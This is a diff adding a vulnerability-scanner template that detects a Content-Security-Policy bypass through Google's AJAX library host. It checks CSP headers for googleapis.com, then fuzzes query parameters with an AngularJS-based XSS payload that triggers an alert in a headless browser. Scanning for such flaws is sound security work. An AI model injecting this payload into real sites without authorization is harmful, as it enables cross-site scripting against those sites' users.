@@ -1,0 +1,46 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - google_ajax_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div
+      ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: google_ajax_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - googleapis.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: google-ajax-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - Google AJAX
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,google-ajax,vuln
